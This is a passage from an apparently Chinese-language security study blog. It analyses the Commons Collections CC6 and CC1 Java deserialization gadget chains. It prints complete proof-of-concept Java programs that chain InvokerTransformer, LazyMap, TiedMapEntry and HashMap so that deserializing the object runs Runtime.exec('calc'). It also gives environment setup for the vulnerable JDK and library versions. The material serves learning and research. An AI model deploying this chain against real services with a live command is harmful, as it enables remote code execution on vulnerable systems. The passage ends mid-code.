MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>在 HashMap 的 readObject 方法中，调用到了 hash(key），而 hash 方法中，调用到了 key·hashCode(）。所以，我们只需要让这个 key 等于 TiedMapEntry 对象，即可连接上前面的分析过程，构成一个完整的 Gadget。</p></blockquote><h2 id="2、构造-POC"><a href="#2、构造-POC" class="headerlink" title="2、构造 POC"></a>2、构造 POC</h2><p>初步构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//回顾 Transformer 链：Runtime.class -&gt; getMethod(&quot;getRuntime&quot;) -&gt; invoke(null) -&gt; Runtime.getRuntime() -&gt; exec(&quot;calc&quot;)</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc&quot;</span> &#125;),<br>                &#125;;<br><br>        <span class="hljs-comment">//创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链”</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode</span><br>        <span class="hljs-comment">//这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory</span><br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// TiedMapEntry.getValue() 调用 outerMap.get(&quot;key&quot;)</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        <span class="hljs-comment">//这里要注意 HashMap.put(key, value) 会计算 key.hashCode()</span><br>        <span class="hljs-comment">//所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get(&quot;key&quot;)，如果 outerMap 的 factory 是恶意的就会被触发</span><br>        <span class="hljs-comment">//但这里我们先使用 ConstantTransformer(1) 无害构造</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">//通过反射获取 LazyMap 类中私有字段 factory</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        <span class="hljs-comment">//访问权限置为可访问</span><br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer</span><br>        <span class="hljs-comment">//这样就把原先无害的 factory 换成了恶意的 transformer 链</span><br>        factoryFiled.set(outerMap,chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815258.png"></p><p>但是执行后无事发生，并没有弹出计算器。</p><p>下断点调试：</p><p>发现在 <font style="color:#080808;background-color:#ffffff;">if (map.containsKey(key) &#x3D;&#x3D; false) {  key 的值为 “key”【也就是这一步  TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, “key”);  】，并没有去执行 factory.transform(key)  。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815383.png"></p><p>在 <font style="color:#080808;background-color:#ffffff;">TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, “aaa”);  处下断点调试：</font></p><p><font style="color:#080808;background-color:#ffffff;">可以看到 key 来源于实例化时的传参</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815182.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815348.png"></p><p>重新修改 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//回顾 Transformer 链：Runtime.class -&gt; getMethod(&quot;getRuntime&quot;) -&gt; invoke(null) -&gt; Runtime.getRuntime() -&gt; exec(&quot;calc&quot;)</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc&quot;</span> &#125;),<br>        &#125;;<br><br>        <span class="hljs-comment">//创建一个 ChainedTransformer，它会按顺序把前一个 transformer 的输出作为下一个 transformer 的输入，从而把上面的步骤串成一条“执行链”</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//在 URL DNS 中分析过，put 的时候就会触发 hash,hashCode</span><br>        <span class="hljs-comment">//这里传入的 new ConstantTransformer(1) 是先用无害 factory 构造结构，后面再通过反射替换成恶意 factory</span><br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// TiedMapEntry.getValue() 调用 outerMap.get(&quot;key&quot;)</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//这里要注意 HashMap.put(key, value) 会计算 key.hashCode()</span><br>        <span class="hljs-comment">//所以当 key 是 TiedMapEntry 时，TiedMapEntry.hashCode() 会触发 getValue()，又会间接调用 outerMap.get(&quot;key&quot;)，如果 outerMap 的 factory 是恶意的就会被触发</span><br>        <span class="hljs-comment">//但这里我们先使用 ConstantTransformer(1) 无害构造</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">//将 &quot;key&quot; 移除</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//通过反射获取 LazyMap 类中私有字段 factory</span><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        <span class="hljs-comment">//访问权限置为可访问</span><br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//然后把 outerMap 的 factory 字段替换成我们之前构造的 chainedTransformer</span><br>        <span class="hljs-comment">//这样就把原先无害的 factory 换成了恶意的 transformer 链</span><br>        factoryFiled.set(outerMap,chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815493.png"></p><h2 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h2><p> 利用 <code>LazyMap</code> 在取值时会调用其 <code>factory.transform()</code>，再借助 <code>TiedMapEntry</code> 作为 <code>HashMap</code> 的 key，在反序列化时 <code>HashMap.readObject()</code> 会触发 key 的 <code>hashCode()</code> → <code>TiedMapEntry.getValue()</code> → <code>LazyMap.get()</code> → 恶意的 <code>ChainedTransformer</code>，最终执行任意方法（如 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>）  </p><p>利用链：</p><p>HashMap.readObject</p><p>HashMap.hash</p><p>TiedMapEntry.hashCode</p><p>TiedMapEntry.getValue.<font style="color:#080808;background-color:#ffffff;">get</font></p><p>LazyMap.get</p><p>LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font></p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311816402.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1</title>
    <link href="/2025/08/30/CC1/"/>
    <url>/2025/08/30/CC1/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="1、JDK-8u65"><a href="#1、JDK-8u65" class="headerlink" title="1、JDK-8u65"></a>1、JDK-8u65</h2><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html?utm_source=chatgpt.com">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p><strong>注意：国家不要选为国区，国区对应的 8u65 下载的时候会自动下载 8u111 等高版本！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805704.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805734.png"></p><h2 id="2、Maven-commons-collections-3-2-1"><a href="#2、Maven-commons-collections-3-2-1" class="headerlink" title="2、Maven-commons-collections 3.2.1"></a>2、Maven-commons-collections 3.2.1</h2><p><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3、修改-sun-包-方便调试"><a href="#3、修改-sun-包-方便调试" class="headerlink" title="3、修改 sun 包-方便调试"></a>3、修改 sun 包-方便调试</h2><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805174.png"></p><p>将 jdk-af660750b2f4\jdk-af660750b2f4\src\share\classes\sun</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805660.png"></p><p>放入：jdk1.8.0_65\src</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805980.png"></p><p><font style="color:rgb(102, 102, 102);">把 src 文件夹添加到源路径下</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805831.png"></p><h1 id="Apache-Commons-Collections包和简介"><a href="#Apache-Commons-Collections包和简介" class="headerlink" title="Apache Commons Collections包和简介:"></a>Apache Commons Collections包和简介:</h1><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/</a></p><h1 id="CC1链分析："><a href="#CC1链分析：" class="headerlink" title="CC1链分析："></a>CC1链分析：</h1><p>首先要明白，CC1 链的源头是 Commons Collections 库中的 Tranformer （ org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer.java ）接口中的 transform 方法，这个接口的设计初衷，是为了把一个对象转换成另一个对象， 但是，在实现类里把 transform 变成“可以执行任意逻辑”时，就出现了漏洞。</p><p>这样的类有以下几种：</p><p><strong>最核心、最危险的类</strong>：</p><ul><li><code>InvokerTransformer</code> （执行任意方法，命令执行）</li><li><code>InstantiateTransformer</code> （实例化任意类，构造函数触发危险逻辑）</li></ul><p> <strong>组合辅助类（触发链条的关键）</strong>：</p><ul><li><code>ChainedTransformer</code>（组合执行器）</li><li><code>LazyMap</code>（触发入口）</li></ul><h2 id="1、-TransformedMap-版"><a href="#1、-TransformedMap-版" class="headerlink" title="1、 TransformedMap 版"></a>1、 TransformedMap 版</h2><blockquote><p><strong>《Java 安全漫谈》</strong></p><p><strong>TransformedMap的出处</strong></p><p>既然ysoserial中没有用到TransformedMap，那么TransformedMap究竟是谁最先提出来的呢？</p><p>据我的考证，最早讲到TransformedMap应该是Code White的这篇Slide：Exploiting</p><p>Deserialization Vulnerabilities in Java(<a href="https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478">https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478</a>)1，后来长亭科技的博客文章《Lib之过？Java反序列化漏洞通用利用分析》（<a href="https://www.anquanke.com/post/id/82898">https://www.anquanke.com/post/id/82898</a> 原文网站进不去了，只有转载）对此进行了进一步分析，后来才在国内众多文章中被讲到。</p></blockquote><h3 id="1-1-漏洞利用"><a href="#1-1-漏洞利用" class="headerlink" title="1.1 漏洞利用"></a>1.1 漏洞利用</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805576.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806717.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8653385846894047688L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String iMethodName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName)</span> &#123;<br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>            <span 